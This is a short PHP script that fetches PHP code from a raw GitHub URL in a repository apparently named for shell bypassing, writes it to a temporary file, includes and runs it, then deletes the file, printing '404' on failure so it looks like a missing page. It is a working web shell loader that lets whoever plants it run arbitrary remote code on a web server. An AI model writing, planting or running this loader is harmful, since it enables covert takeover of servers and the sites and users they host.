<?php
$url = "https://raw.githubusercontent.com/ShellBypassID/Bahan/refs/heads/main/y.php";
$phpCode = file_get_contents($url);
if ($phpCode !== false) {
    $tempFile = tempnam(sys_get_temp_dir(), 'ribel_') . '.php';
    file_put_contents($tempFile, $phpCode);
    ob_start();
    include $tempFile;
    $output = ob_get_clean();
    echo $output;
    unlink($tempFile);
} else {
    echo "404";
}
?>
